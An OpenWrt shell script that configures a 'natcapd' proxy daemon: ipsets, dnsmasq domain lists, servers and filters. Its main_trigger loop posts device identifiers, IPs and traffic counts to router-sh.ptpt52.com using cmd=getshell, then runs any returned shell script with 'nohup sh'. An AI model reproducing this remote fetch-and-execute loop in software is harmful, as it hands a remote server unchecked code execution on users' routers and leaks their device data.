#!/bin/sh

TO="timeout"
which timeout >/dev/null 2>&1 && timeout -t1 pwd >/dev/null 2>&1 && TO="timeout -t"

WGET=/usr/bin/wget
test -x $WGET || WGET=/bin/wget
which timeout >/dev/null 2>&1 && WGET="$TO 300 $WGET"

PID=$$
DEV=/dev/natcap_ctl

# mytimeout [Time] [cmd]
mytimeout() {
	local to=$1
	local T=0
	local I=30
	if test $to -le $I; then
		I=$to
	fi
	shift
	if which timeout >/dev/null 2>&1; then
		opt=`timeout -t1 pwd >/dev/null 2>&1 && echo "-t"`
		while test -f $LOCKDIR/$PID; do
			if timeout $opt $I $@ 2>/dev/null; then
				return 0
			else
				T=$((T+I))
				if test $T -ge $to; then
					return 0
				fi
			fi
		done
		return 1
	else
		sh -c "$@"
		return $?
	fi
}

natcapd_trigger()
{
	local path=$1
	local opt

	if which timeout >/dev/null 2>&1; then
		opt=`timeout -t1 pwd >/dev/null 2>&1 && echo "-t"`
		timeout $opt 5 sh -c "echo >$path" 2>/dev/null
	else
		sh -c "echo >$path"
	fi
	return $?
}

natcapd_stop()
{
	echo stop
	echo clean >>$DEV
	#never stop kmod
	echo disabled=0 >>$DEV

	rm /tmp/dnsmasq.d/accelerated-domains.gfwlist.dnsmasq.conf 2>/dev/null || \
	rm /tmp/dnsmasq.d/custom-domains.gfwlist.dnsmasq.conf 2>/dev/null && \
	/etc/init.d/dnsmasq restart

	rm -f /tmp/natcapd.running
	return 0
}

b64encode() {
	cat - | base64 | sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/ /g' | sed 's/ //g;s/=/_/g'
}

txrx_vals_dump() {
	test -f /tmp/natcapd.txrx || echo "0 0" >/tmp/natcapd.txrx
	cat /tmp/natcapd.txrx | while read tx1 rx1; do
		echo `cat $DEV  | grep flow_total_ | cut -d= -f2` | while read tx2 rx2; do
			tx=$((tx2-tx1))
			rx=$((rx2-rx1))
			if test $tx2 -lt $tx1 || test $rx2 -lt $rx1; then
				tx=$tx2
				rx=$rx2
			fi
			echo $tx $rx
			return 0
		done
	done
}

test -c $DEV || exit 1

natcapd_boot() {
	board_mac_addr=`lua /usr/share/natcapd/board_mac.lua`
	if test -n "$board_mac_addr"; then
		echo default_mac_addr=$board_mac_addr >$DEV
	fi

	client_mac=$board_mac_addr
	test -n "$client_mac" || {
		client_mac=`cat $DEV | grep default_mac_addr | grep -o "[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]"`
		if [ "x$client_mac" = "x00:00:00:00:00:00" ]; then
			client_mac=`uci get natcapd.default.default_mac_addr 2>/dev/null`
			test -n "$client_mac" || client_mac=`cat /sys/class/net/eth0/address | tr a-z A-Z`
			test -n "$client_mac" || client_mac=`cat /sys/class/net/eth1/address | tr a-z A-Z`
			test -n "$client_mac" || client_mac=`head -c6 /dev/urandom | hexdump -e '/1 "%02X:"' | head -c17`
			test -n "$client_mac" || client_mac=`head -c6 /dev/random | hexdump -e '/1 "%02X:"' | head -c17`
			uci set natcapd.default.default_mac_addr="$client_mac"
			uci commit natcapd
			echo default_mac_addr=$client_mac >$DEV
		fi
		eth_mac=`cat /sys/class/net/eth0/address | tr a-z A-Z`
		test -n "$eth_mac" && [ "x$client_mac" != "x$eth_mac" ] && {
			client_mac=$eth_mac
			echo default_mac_addr=$client_mac >$DEV
		}
	}
}

[ x$1 = xboot ] && {
	natcapd_boot
	exit 0
}

client_mac=`cat $DEV | grep default_mac_addr | grep -o "[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]:[0-9A-F][0-9A-F]"`
account="`uci get natcapd.default.account 2>/dev/null`"
uhash=`echo -n $client_mac$account | cksum | awk '{print $1}'`
echo u_hash=$uhash >>$DEV

ACC="$account"
CLI=`echo $client_mac | sed 's/:/-/g' | tr a-z A-Z`
MOD=`cat /etc/board.json | grep model -A2 | grep id\": | sed 's/"/ /g' | awk '{print $3}'`

. /etc/openwrt_release
TAR=`echo $DISTRIB_TARGET | sed 's/\//-/g'`
VER=`echo -n "$DISTRIB_ID-$DISTRIB_RELEASE-$DISTRIB_REVISION-$DISTRIB_CODENAME" | b64encode`

natcapd_get_flows()
{
	local IDX=$1
	local TXRX=`txrx_vals_dump| b64encode`
	URI="/router-update.cgi?cmd=getflows&acc=$ACC&cli=$CLI&idx=$IDX&txrx=$TXRX&mod=$MOD&tar=$TAR"
	$WGET --timeout=180 --ca-certificate=/tmp/cacert.pem -qO- "https://router-sh.ptpt52.com$URI"
}

[ x$1 = xget_flows0 ] && {
	natcapd_get_flows 0 || echo "Get data failed!"
	exit 0
}
[ x$1 = xget_flows1 ] && {
	natcapd_get_flows 1 || echo "Get data failed!"
	exit 0
}

natcap_wan_ip()
{
	full_cone_nat="`uci get natcapd.default.full_cone_nat 2>/dev/null || echo 0`"
	if [ "x$full_cone_nat" = "x0" ]; then
		ipset destroy natcap_wan_ip >/dev/null 2>&1
	else
		ipset create natcap_wan_ip iphash >/dev/null 2>&1
		ipset flush natcap_wan_ip
		devs=`ip r | grep default | grep -o "dev ".* | awk '{print $2}'`
		for dev in $devs; do
			ips=`ip addr list dev $dev | grep -o inet" ".* | awk '{print $2}' | cut -d/ -f1`
			for ip in $ips; do
				ipset add natcap_wan_ip $ip >/dev/null 2>&1
			done
		done
	fi
}

[ x$1 = xnatcap_wan_ip ] && {
	natcap_wan_ip
	exit 0
}

[ x$1 = xstop ] && natcapd_stop && exit 0

[ x$1 = xstart ] || {
	echo "usage: $0 start|stop"
	exit 0
}

add_server () {
	local server=$1
	local opt=$2
	local enc_mode=$3

	if echo $server | grep -q '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)$'; then
		echo server $server:0-$opt-$enc_mode >>$DEV
	elif echo $server | grep -q '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\):[0-9]\{1,5\}$'; then
		echo server $server-$opt-$enc_mode >$DEV
	elif echo $server | grep -q '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\):[0-9]\{1,5\}-[eo]$'; then
		echo server $server-$enc_mode >>$DEV
	elif echo $server | grep -q '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\):[0-9]\{1,5\}-[eo]-[TU]-[UT]$'; then
		echo server $server >>$DEV
	fi
}
add_udproxylist () {
	ipset -! add udproxylist $1
}
add_gfwlist () {
	ipset -! add gfwlist $1
}
add_knocklist () {
	ipset -! add knocklist $1
}
add_gfwlist_domain () {
	echo server=/$1/8.8.8.8 >>/tmp/dnsmasq.d/custom-domains.gfwlist.dnsmasq.conf
	echo ipset=/$1/gfwlist >>/tmp/dnsmasq.d/custom-domains.gfwlist.dnsmasq.conf
}

_reload_natcapd() {
	NATCAPD_BIN=natcapd-server
	if which $NATCAPD_BIN >/dev/null 2>&1; then
		natcap_redirect_port=`uci get natcapd.default.natcap_redirect_port 2>/dev/null || echo 0`
		sleep 1 && killall $NATCAPD_BIN >/dev/null 2>&1 && sleep 2
		test $natcap_redirect_port -gt 0 && test $natcap_redirect_port -lt 65535 && {
			echo natcap_redirect_port=$natcap_redirect_port >$DEV
			(
			$NATCAPD_BIN -l$natcap_redirect_port -t 900 >/dev/null 2>&1
			echo natcap_redirect_port=0 >$DEV
			) &
		}
	fi

	NATCAPD_BIN=natcapd-client
	if which $NATCAPD_BIN >/dev/null 2>&1; then
		natcap_client_redirect_port=`uci get natcapd.default.natcap_client_redirect_port 2>/dev/null || echo 0`
		sleep 1 && killall $NATCAPD_BIN >/dev/null 2>&1 && sleep 2
		test $natcap_client_redirect_port -gt 0 && test $natcap_client_redirect_port -lt 65535 && {
			echo natcap_client_redirect_port=$natcap_client_redirect_port >$DEV
			(
			$NATCAPD_BIN -l$natcap_client_redirect_port -t 900 >/dev/null 2>&1
			echo natcap_client_redirect_port=0 >$DEV
			) &
		}
	fi
}

natcap_wan_ip

enabled="`uci get natcapd.default.enabled 2>/dev/null || echo 0`"

# reload firewall
uci get firewall.natcapd >/dev/null 2>&1 || {
	uci -q batch <<-EOT
		delete firewall.natcapd
		set firewall.natcapd=include
		set firewall.natcapd.type=script
		set firewall.natcapd.path=/usr/share/natcapd/firewall.include
		set firewall.natcapd.family=any
		set firewall.natcapd.reload=1
		commit firewall
	EOT
	/etc/init.d/firewall reload >/dev/null 2>&1 || echo /etc/init.d/firewall reload failed
}

test -c /dev/natflow_ctl && {
	enable_natflow=`uci get natcapd.default.enable_natflow 2>/dev/null || echo 0`
	echo debug=3 >/dev/natflow_ctl
	echo disabled=$((!enable_natflow)) >/dev/natflow_ctl
}

if [ "x$enabled" = "x0" ] && test -c $DEV; then
	natcapd_stop
	rm -f /tmp/natcapd_to_cn

	_reload_natcapd
elif test -c $DEV; then
	echo disabled=0 >>$DEV
	touch /tmp/natcapd.running
	debug=`uci get natcapd.default.debug 2>/dev/null || echo 3`
	enable_encryption=`uci get natcapd.default.enable_encryption 2>/dev/null || echo 1`
	clear_dst_on_reload=`uci get natcapd.default.clear_dst_on_reload 2>/dev/null || echo 0`
	server_persist_timeout=`uci get natcapd.default.server_persist_timeout 2>/dev/null || echo 300`
	server_persist_lock=`uci get natcapd.default.server_persist_lock 2>/dev/null || echo 0`
	tx_speed_limit=`uci get natcapd.default.tx_speed_limit 2>/dev/null || echo 0`
	rx_speed_limit=`uci get natcapd.default.rx_speed_limit 2>/dev/null || echo 0`
	tx_pkts_threshold=`uci get natcapd.default.tx_pkts_threshold 2>/dev/null || echo 128`
	rx_pkts_threshold=`uci get natcapd.default.rx_pkts_threshold 2>/dev/null || echo 512`
	touch_timeout=`uci get natcapd.default.touch_timeout 2>/dev/null || echo 32`
	servers=`uci get natcapd.default.server 2>/dev/null`
	dns_server=`uci get natcapd.default.dns_server 2>/dev/null`
	knocklist=`uci get natcapd.default.knocklist 2>/dev/null`
	udproxylist=`uci get natcapd.default.udproxylist 2>/dev/null`
	dnsdroplist=`uci get natcapd.default.dnsdroplist 2>/dev/null`
	gfwlist_domain=`uci get natcapd.default.gfwlist_domain 2>/dev/null`
	gfwlist=`uci get natcapd.default.gfwlist 2>/dev/null`
	encode_mode=`uci get natcapd.default.encode_mode 2>/dev/null || echo 0`
	udp_encode_mode=`uci get natcapd.default.udp_encode_mode 2>/dev/null || echo 0`
	sproxy=`uci get natcapd.default.sproxy 2>/dev/null || echo 0`
	access_to_cn=`uci get natcapd.default.access_to_cn 2>/dev/null || echo 0`
	full_proxy=`uci get natcapd.default.full_proxy 2>/dev/null || echo 0`
	[ x$encode_mode = x0 ] && encode_mode=T
	[ x$encode_mode = x1 ] && encode_mode=U
	[ x$udp_encode_mode = x0 ] && udp_encode_mode=U
	[ x$udp_encode_mode = x1 ] && udp_encode_mode=T

	encode_http_only=`uci get natcapd.default.encode_http_only 2>/dev/null || echo 0`
	http_confusion=`uci get natcapd.default.http_confusion 2>/dev/null || echo 0`
	htp_confusion_host=`uci get natcapd.default.htp_confusion_host 2>/dev/null || echo bing.com`
	cnipwhitelist_mode=`uci get natcapd.default.cnipwhitelist_mode 2>/dev/null || echo 0`

	macfilter=`uci get natcapd.default.macfilter 2>/dev/null`
	maclist=`uci get natcapd.default.maclist 2>/dev/null`
	ipfilter=`uci get natcapd.default.ipfilter 2>/dev/null`
	iplist=`uci get natcapd.default.iplist 2>/dev/null`

	cniplist_set=/usr/share/natcapd/cniplist.set
	if [ x$access_to_cn = x1 ]; then
		cnipwhitelist_mode=1
		cniplist_set=/usr/share/natcapd/C_cniplist.set
		rm /tmp/dnsmasq.d/accelerated-domains.gfwlist.dnsmasq.conf 2>/dev/null && \
		/etc/init.d/dnsmasq restart
		rm -f /tmp/natcapd.lck/gfwlist
	fi
	if [ x$full_proxy = x1 ]; then
		cnipwhitelist_mode=1
		cniplist_set=/usr/share/natcapd/local.set
	fi

	ipset destroy dnsdroplist >/dev/null 2>&1
	if test -n "$dnsdroplist"; then
		ipset -n list dnsdroplist >/dev/null 2>&1 || ipset -! create dnsdroplist nethash
		for d in $dnsdroplist; do
			ipset -! add dnsdroplist $d
		done
	fi

	ipset -n list udproxylist >/dev/null 2>&1 || ipset -! create udproxylist iphash
	ipset -n list gfwlist >/dev/null 2>&1 || ipset -! create gfwlist iphash
	ipset -n list knocklist >/dev/null 2>&1 || ipset -! create knocklist iphash
	ipset -n list bypasslist >/dev/null 2>&1 || ipset -! create bypasslist iphash

	ipset destroy cniplist >/dev/null 2>&1
	echo 'create cniplist hash:net family inet hashsize 4096 maxelem 65536' >/tmp/cniplist.set
	(ip route | grep -o '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)/[0-9]\{1,2\}'; \
	cat $cniplist_set) | sort | uniq | sed 's/^/add cniplist /' >>/tmp/cniplist.set
	ipset restore -f /tmp/cniplist.set
	rm -f /tmp/cniplist.set

	echo debug=$debug >>$DEV
	echo clean >>$DEV
	echo server_persist_timeout=$server_persist_timeout >>$DEV
	echo server_persist_lock=$server_persist_lock >>$DEV
	echo tx_speed_limit=$tx_speed_limit >>$DEV
	echo rx_speed_limit=$rx_speed_limit >>$DEV
	echo tx_pkts_threshold=$tx_pkts_threshold >>$DEV
	echo rx_pkts_threshold=$rx_pkts_threshold >>$DEV
	echo natcap_touch_timeout=$touch_timeout >>$DEV
	echo sproxy=$sproxy >$DEV
	test -n "$dns_server" && echo dns_server=$dns_server >$DEV

	[ "x$clear_dst_on_reload" = x1 ] && ipset flush gfwlist

	echo encode_http_only=$encode_http_only >>$DEV
	echo http_confusion=$http_confusion >>$DEV
	echo htp_confusion_host=$htp_confusion_host >>$DEV
	echo cnipwhitelist_mode=$cnipwhitelist_mode >>$DEV

	test -n "$maclist" && {
		ipset -n list natcap_maclist >/dev/null 2>&1 || ipset -! create natcap_maclist machash
		ipset flush natcap_maclist
		for m in $maclist; do
			ipset -! add natcap_maclist $m
		done
	}
	if [ x"$macfilter" == xallow ]; then
		echo macfilter=1 >>$DEV
	elif [ x"$macfilter" == xdeny ]; then
		echo macfilter=2 >>$DEV
	else
		echo macfilter=0 >>$DEV
		ipset destroy natcap_maclist >/dev/null 2>&1
	fi

	test -n "$iplist" && {
		ipset -n list natcap_iplist >/dev/null 2>&1 || ipset -! create natcap_iplist nethash
		ipset flush natcap_iplist
		for n in $iplist; do
			ipset -! add natcap_iplist $n
		done
	}
	if [ x"$ipfilter" == xallow ]; then
		echo ipfilter=1 >>$DEV
	elif [ x"$ipfilter" == xdeny ]; then
		echo ipfilter=2 >>$DEV
	else
		echo ipfilter=0 >>$DEV
		ipset destroy natcap_iplist >/dev/null 2>&1
	fi

	opt="o"
	[ "x$enable_encryption" = x1 ] && opt='e'
	for server in $servers; do
		add_server $server $opt $encode_mode-$udp_encode_mode
		g=`echo $server | sed 's/:/ /' | awk '{print $1}'`
		add_knocklist $g
	done

	for server in `cat /tmp/natcapd_extra_servers 2>/dev/null`; do
		add_server $server $opt $encode_mode-$udp_encode_mode
	done

	for k in $knocklist; do
		add_knocklist $k
	done

	for u in $udproxylist; do
		add_udproxylist $u
	done
	for g in $gfwlist; do
		add_gfwlist $g
	done

	rm -f /tmp/dnsmasq.d/custom-domains.gfwlist.dnsmasq.conf
	mkdir -p /tmp/dnsmasq.d
	touch /tmp/dnsmasq.d/custom-domains.gfwlist.dnsmasq.conf
	for d in $gfwlist_domain; do
		add_gfwlist_domain $d
	done

	#reload dnsmasq
	if test -p /tmp/trigger_gfwlist_update.fifo; then
		natcapd_trigger '/tmp/trigger_gfwlist_update.fifo'
	fi

	_reload_natcapd
fi

#reload pptpd
test -f /usr/share/natcapd/natcapd.pptpd.sh && sh /usr/share/natcapd/natcapd.pptpd.sh
#reload openvpn
test -f /usr/share/natcapd/natcapd.openvpn.sh && sh /usr/share/natcapd/natcapd.openvpn.sh

cd /tmp

_NAME=`basename $0`

LOCKDIR=/tmp/$_NAME.lck

cleanup () {
	if rm -rf $LOCKDIR; then
		echo "Finished"
	else
		echo "Failed to remove lock directory '$LOCKDIR'"
		return 1
	fi
}

nslookup_check () {
	local domain ipaddr
	domain=${1-www.baidu.com}
	ipaddr=`nslookup $domain 2>/dev/null | grep "$domain" -A1 | grep Address | grep -o '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)' | head -n1`
	test -n "$ipaddr" || {
		ipaddr=`nslookup $domain 114.114.114.114 2>/dev/null | grep "$domain" -A1 | grep Address | grep -o '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)' | head -n1`
		test -n "$ipaddr" || {
			ipaddr=`nslookup $domain 8.8.8.8 2>/dev/null | grep "$domain" -A1 | grep Address | grep -o '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)' | head -n1`
		}
	}
	echo "$ipaddr"
}

gfwlist_update_main () {
	test -f /tmp/natcapd.running && sh /usr/share/natcapd/gfwlist_update.sh
	while :; do
		test -f $LOCKDIR/$PID || return 0
		test -p /tmp/trigger_gfwlist_update.fifo || { sleep 1 && continue; }
		mytimeout 86340 'cat /tmp/trigger_gfwlist_update.fifo' >/dev/null && {
			test -f /tmp/natcapd.running && sh /usr/share/natcapd/gfwlist_update.sh
		}
	done
}

natcapd_first_boot() {
	mkdir /tmp/natcapd.lck/watcher.lck >/dev/null 2>&1 || return 0
	local run=0
	while :; do
		ping -q -W3 -c1 114.114.114.114 >/dev/null 2>&1 || ping -q -W3 -c1 8.8.8.8 >/dev/null 2>&1 || ping -q -W3 -c1 www.baidu.com >/dev/null 2>&1 || {
			# restart ping after 8 secs
			sleep 8
			continue
		}
		[ x$run = x1 ] || {
			run=1
			test -p /tmp/trigger_natcapd_update.fifo && natcapd_trigger '/tmp/trigger_natcapd_update.fifo'
			sleep 5
		}
		test -f /tmp/natcapd.running || break
		test -f /tmp/natcapd.lck/gfwlist && break
		test -p /tmp/trigger_gfwlist_update.fifo && natcapd_trigger '/tmp/trigger_gfwlist_update.fifo'
		sleep 60
	done
	rmdir /tmp/natcapd.lck/watcher.lck
}

txrx_vals() {
	test -f /tmp/natcapd.txrx || echo "0 0" >/tmp/natcapd.txrx
	cat /tmp/natcapd.txrx | while read tx1 rx1; do
		echo `cat $DEV  | grep flow_total_ | cut -d= -f2` | while read tx2 rx2; do
			tx=$((tx2-tx1))
			rx=$((rx2-rx1))
			if test $tx2 -lt $tx1 || test $rx2 -lt $rx1; then
				tx=$tx2
				rx=$rx2
			fi
			echo $tx $rx
			cp /tmp/natcapd.txrx /tmp/natcapd.txrx.old
			echo $tx2 $rx2 >/tmp/natcapd.txrx
			return 0
		done
	done
}

ping_cli() {
	PING="ping"
	which timeout >/dev/null 2>&1 && PING="$TO 30 $PING"
	while :; do
		test -f $LOCKDIR/$PID || return 0
		PINGH=`uci get natcapd.default.peer_host`
		test -n "$PINGH" || PINGH=ec2ns.ptpt52.com
		if [ "$(echo $PINGH | wc -w)" = "1" ]; then
			$PING -t1 -s16 -c16 -W1 -q $PINGH
			sleep 1
		else
			for hh in $PINGH; do
				$PING -t1 -s16 -c16 -W1 -q "$hh" &
			done
			sleep 16
		fi
	done
}

main_trigger() {
	local SEQ=0
	local hostip
	local built_in_server
	cp /usr/share/natcapd/cacert.pem /tmp/cacert.pem
	while :; do
		test -f $LOCKDIR/$PID || return 0
		test -p /tmp/trigger_natcapd_update.fifo || { sleep 1 && continue; }
		mytimeout 660 'cat /tmp/trigger_natcapd_update.fifo' >/dev/null && {
			rm -f /tmp/xx.tmp.json
			rm -f /tmp/nohup.out
			IFACES=`ip r | grep default | grep -o 'dev .*' | cut -d" " -f2`
			LIP=""
			for IFACE in $IFACES; do
				LIP="$LIP:`ifconfig $IFACE | grep 'inet addr:' | sed 's/:/ /' | awk '{print $3}'`"
			done
			LIP=`echo $LIP | sed 's/^://'`

			#checking extra run status
			UP=`cat /proc/uptime | cut -d"." -f1`

			SRV="`cat /dev/natcap_ctl | grep current_server | grep -o '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)'`"
			TXRX=`txrx_vals | b64encode`
			CV=`uci get natcapd.default.config_version 2>/dev/null`
			ACC=`uci get natcapd.default.account 2>/dev/null`
			hostip=`nslookup_check router-sh.ptpt52.com`
			built_in_server=`uci get natcapd.default._built_in_server`
			test -n "$built_in_server" || built_in_server=119.29.195.202
			test -n "$hostip" || hostip=$built_in_server
			ipset add bypasslist $built_in_server 2>/dev/null
			ipset add bypasslist $hostip 2>/dev/null
			URI="/router-update.cgi?cmd=getshell&acc=$ACC&cli=$CLI&ver=$VER&cv=$CV&tar=$TAR&mod=$MOD&txrx=$TXRX&seq=$SEQ&up=$UP&lip=$LIP&srv=$SRV"
			$WGET --timeout=180 --ca-certificate=/tmp/cacert.pem -qO /tmp/xx.tmp.json \
				"https://router-sh.ptpt52.com$URI" || \
				$WGET --timeout=60 --header="Host: router-sh.ptpt52.com" --ca-certificate=/tmp/cacert.pem -qO /tmp/xx.tmp.json \
					"https://$hostip$URI" || {
						$WGET --timeout=60 --header="Host: router-sh.ptpt52.com" --ca-certificate=/tmp/cacert.pem -qO /tmp/xx.tmp.json \
							"https://$built_in_server$URI" || {
							#XXX disable dns proxy, becasue of bad connection
							cp /tmp/natcapd.txrx.old /tmp/natcapd.txrx
							continue
						}
					}
			head -n1 /tmp/xx.tmp.json | grep -q '#!/bin/sh' >/dev/null 2>&1 && {
				nohup sh /tmp/xx.tmp.json &
			}
			head -n1 /tmp/xx.tmp.json | grep -q '#!/bin/sh' >/dev/null 2>&1 || {
				mv /tmp/xx.tmp.json /tmp/xx.json
			}
			SEQ=$((SEQ+1))
		}
	done
}

if mkdir $LOCKDIR >/dev/null 2>&1; then
	trap "cleanup" EXIT

	echo "Acquired lock, running"

	rm -f $LOCKDIR/*
	touch $LOCKDIR/$PID

	mkfifo /tmp/trigger_gfwlist_update.fifo 2>/dev/null
	mkfifo /tmp/trigger_natcapd_update.fifo 2>/dev/null

	gfwlist_update_main &
	main_trigger &
	natcapd_first_boot &

	ping_cli
else
	natcapd_first_boot &
	exit 0
fi
